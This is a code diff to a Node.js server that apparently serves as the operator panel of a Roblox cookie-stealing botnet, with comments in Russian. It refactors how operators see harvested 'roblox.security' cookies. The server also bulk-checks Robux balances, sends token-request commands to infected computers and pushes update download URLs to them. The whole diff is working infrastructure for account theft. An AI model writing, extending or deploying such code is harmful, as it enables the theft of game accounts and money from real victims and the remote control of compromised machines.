@@ -194,6 +194,35 @@ function getCanonicalOperator(username) {
   return match || username;
 }
 
+// ── Фильтрация токенов и файлов по операторам ────────────────────────────────
+// Shonll видит свои токены + нераспределенные + токены от HuilaEbanaya
+// HuilaEbanaya видит только свои токены
+function getOperatorQuery(user) {
+  const u = (user || '').toLowerCase();
+  if (u === 'shonll') {
+    return {
+      $or: [
+        { operator: { $regex: /^shonll$/i } },
+        { operator: { $regex: /^huilaebanaya$/i } },
+        { operator: { $exists: false } },
+        { operator: null },
+        { operator: '' }
+      ]
+    };
+  }
+  return { operator: { $regex: new RegExp('^' + escapeRegex(user) + '$', 'i') } };
+}
+
+function isOperatorMatch(user, entryOperator) {
+  const u = (user || '').toLowerCase();
+  const op = (entryOperator || '').toLowerCase();
+  if (u === 'shonll') {
+    return !op || op === 'shonll' || op === 'huilaebanaya';
+  }
+  return op === u;
+}
+
+
 // ── Хеширование паролей (scrypt + salt, встроенный модуль crypto) ──────────────
 function hashPassword(password, salt) {
   if (!password || typeof password !== 'string') return '';
@@ -439,7 +468,6 @@ async function setOperatorSettings(user, patch) {
 
   if (update.password) {
     update.password = hashPassword(update.password);
-    // NOTE: do NOT put tokenVersion in update/$set — it's handled by $inc below to avoid path conflict
     update.kickedAt = new Date();
     if (typeof operatorAuthCache !== 'undefined') operatorAuthCache.delete(canonical);
   }
@@ -458,23 +486,39 @@ async function setOperatorSettings(user, patch) {
     return;
   }
 
+  const existingDoc = await db.collection('settings').findOne({
+    user: { $regex: new RegExp('^' + escapeRegex(canonical) + '$', 'i') }
+  });
+
   const setObj = { ...update, user: canonical, updatedAt: new Date() };
-  // tokenVersion must NOT be in $set when also in $inc (MongoDB path conflict)
-  delete setObj.tokenVersion;
-
   const mongoUpdate = {};
-  if (Object.keys(setObj).length > 0) mongoUpdate.$set = setObj;
   if (Object.keys(unset).length > 0) mongoUpdate.$unset = unset;
-  if (update.password) mongoUpdate.$inc = { tokenVersion: 1 };
 
-  await db.collection('settings').updateOne(
-    { user: { $regex: new RegExp('^' + escapeRegex(canonical) + '$', 'i') } },
-    mongoUpdate,
-    { upsert: true }
-  );
+  if (existingDoc) {
+    if (update.password) {
+      if (typeof existingDoc.tokenVersion === 'number' && !isNaN(existingDoc.tokenVersion)) {
+        mongoUpdate.$inc = { tokenVersion: 1 };
+        delete setObj.tokenVersion;
+      } else {
+        setObj.tokenVersion = 2;
+      }
+    }
+    if (Object.keys(setObj).length > 0) mongoUpdate.$set = setObj;
+
+    await db.collection('settings').updateOne(
+      { _id: existingDoc._id },
+      mongoUpdate
+    );
+  } else {
+    if (update.password) {
+      setObj.tokenVersion = 1;
+    }
+    await db.collection('settings').insertOne(setObj);
+  }
+
   if (typeof operatorAuthCache !== 'undefined') operatorAuthCache.delete(canonical);
-
 }
+
 
 // Инициализация профилей операторов и поддержка начальных паролей из env переменных
 async function initOperatorSettings() {
@@ -1301,7 +1345,8 @@ app.post('/api/settings', requireAuth, async (req, res) => {
     const updated = await getOperatorSettings(user);
     res.json({ success: true, settings: updated });
   } catch (e) {
-    res.status(500).json({ error: 'Не удалось сохранить (MongoDB недоступна?)' });
+    console.error('[SETTINGS] Error saving settings for', user, ':', e);
+    res.status(500).json({ error: 'Не удалось сохранить: ' + (e && e.message ? e.message : 'ошибка БД') });
   }
 });
 
@@ -1581,9 +1626,7 @@ app.get('/files', requireAuth, async (req, res) => {
   try {
     const db = await getDb();
     let files;
-    const opQuery = (user.toLowerCase() === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
 
     if (db) {
       files = await db.collection('files')
@@ -1591,11 +1634,9 @@ app.get('/files', requireAuth, async (req, res) => {
         .sort({ uploadedAt: -1 })
         .toArray();
     } else {
-      files = (global.memFiles || []).filter(f => {
-        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
-        return isOp;
-      });
+      files = (global.memFiles || []).filter(f => isOperatorMatch(user, f.operator));
     }
+
 
     files = files.map(f => {
       const { data, ...safe } = f;
@@ -1799,19 +1840,14 @@ app.post('/robux-check', requireAuth, async (req, res) => {
 app.post('/robux-bulk', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   const db = await getDb();
-  let docs;
-  const opQuery = (user.toLowerCase() === 'shonll')
-    ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-    : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+  const opQuery = getOperatorQuery(user);
 
   if (db) {
     docs = await db.collection('files').find({ ...opQuery, 'roblox.security': { $exists: true, $ne: '' } }).toArray();
   } else {
-    docs = (global.memFiles || []).filter(f => {
-      const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
-      return isOp && f.roblox && f.roblox.security;
-    });
+    docs = (global.memFiles || []).filter(f => isOperatorMatch(user, f.operator) && f.roblox && f.roblox.security);
   }
+
 
   const BATCH_SIZE = 10;
   const validResults = [];
@@ -1988,9 +2024,7 @@ app.post('/request-token-all', requireAuth, async (req, res) => {
     const user = req.authUser || req.session.user;
     const db = await getDb();
     const now = new Date().toISOString();
-    const opQuery = (user.toLowerCase() === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + escapeRegex(user) + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
     if (db) {
       const result = await db.collection('files').updateMany(
         opQuery,
@@ -2000,16 +2034,14 @@ app.post('/request-token-all', requireAuth, async (req, res) => {
       res.json({ success: true, count: result.modifiedCount });
     } else {
       let count = 0;
-      for (const doc of (global.memFiles || []).filter(f => {
-        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
-        return isOp;
-      })) {
+      for (const doc of (global.memFiles || []).filter(f => isOperatorMatch(user, f.operator))) {
         doc.tokenRequest = { requested: true, requestedAt: now };
         count++;
       }
       console.log(`[${new Date().toLocaleTimeString()}] 📡 Запрос токена у всех: ${count} компьютеров`);
       res.json({ success: true, count });
     }
+
   } catch (e) {
     console.error('Request-token-all error:', e.message);
     res.status(500).json({ error: 'Ошибка сервера' });
@@ -2037,9 +2069,7 @@ app.post('/request-update', requireAuth, async (req, res) => {
     }
 
     const db = await getDb();
-    const opQuery = (userLower === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
 
     if (db) {
       await db.collection('files').updateOne(
@@ -2047,7 +2077,7 @@ app.post('/request-update', requireAuth, async (req, res) => {
         { $set: { 'updateRequest.requested': true, 'updateRequest.downloadUrl': downloadUrl, 'updateRequest.requestedAt': new Date().toISOString() } }
       );
     } else {
-      const doc = (global.memFiles || []).find(f => f.name === filename);
+      const doc = (global.memFiles || []).find(f => f.name === filename && isOperatorMatch(user, f.operator));
       if (doc) {
         doc.updateRequest = { requested: true, downloadUrl: downloadUrl, requestedAt: new Date().toISOString() };
       }
@@ -2081,9 +2111,8 @@ app.post('/request-update-all', requireAuth, async (req, res) => {
 
     const db = await getDb();
     const now = new Date().toISOString();
-    const opQuery = (userLower === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
+
 
     const filter = {
       ...opQuery,
@@ -2160,10 +2189,7 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   try {
     const db = await getDb();
-    let docs;
-    const opQuery = (user.toLowerCase() === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
 
     if (db) {
       docs = await db.collection('files').find({
@@ -2171,11 +2197,9 @@ app.get('/tokens-data', requireAuth, async (req, res) => {
         'roblox.security': { $exists: true, $ne: '' }
       }).sort({ uploadedAt: -1 }).toArray();
     } else {
-      docs = (global.memFiles || []).filter(f => {
-        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
-        return isOp && f.roblox && f.roblox.security;
-      });
+      docs = (global.memFiles || []).filter(f => isOperatorMatch(user, f.operator) && f.roblox && f.roblox.security);
     }
+
 
     const results = docs.map(doc => {
       const roblox = doc.roblox || {};
@@ -2271,9 +2295,7 @@ app.post('/api/bookmark', requireAuth, async (req, res) => {
     const userKey = (user || '').toLowerCase();
     const db = await getDb();
     
-    const opQuery = (user.toLowerCase() === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
     
     if (db) {
       const doc = await db.collection('files').findOne({ name: filename, ...opQuery });
@@ -2300,10 +2322,7 @@ app.post('/api/bookmark', requireAuth, async (req, res) => {
       
       res.json({ bookmarks: newBookmarks });
     } else {
-      const doc = (global.memFiles || []).find(f => {
-        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
-        return isOp && f.name === filename;
-      });
+      const doc = (global.memFiles || []).find(f => isOperatorMatch(user, f.operator) && f.name === filename);
       if (!doc) return res.status(404).json({ error: 'Not found' });
       
       if (!doc.bookmarks || typeof doc.bookmarks !== 'object' || Array.isArray(doc.bookmarks)) {
@@ -2332,9 +2351,7 @@ app.get('/api/bookmarks', requireAuth, async (req, res) => {
     const db = await getDb();
     let docs = [];
     
-    const opQuery = (user.toLowerCase() === 'shonll')
-      ? { $or: [{ operator: { $regex: /^shonll$/i } }, { operator: { $exists: false } }, { operator: null }, { operator: '' }] }
-      : { operator: { $regex: new RegExp('^' + user + '$', 'i') } };
+    const opQuery = getOperatorQuery(user);
     
     if (db) {
       docs = await db.collection('files').find({
@@ -2347,14 +2364,14 @@ app.get('/api/bookmarks', requireAuth, async (req, res) => {
       }).sort({ uploadedAt: -1 }).toArray();
     } else {
       docs = (global.memFiles || []).filter(f => {
-        const isOp = (user.toLowerCase() === 'shonll') ? true : (f.operator || '').toLowerCase() === user.toLowerCase();
-        if (!isOp || !f.roblox?.security) return false;
+        if (!isOperatorMatch(user, f.operator) || !f.roblox?.security) return false;
         if (f.bookmarks && typeof f.bookmarks === 'object' && !Array.isArray(f.bookmarks)) {
           return Array.isArray(f.bookmarks[userKey]) && f.bookmarks[userKey].length > 0;
         }
         return Array.isArray(f.bookmarks) && f.bookmarks.length > 0;
       });
     }
+
     
     const results = docs.map(doc => {
       const roblox = doc.roblox || {};
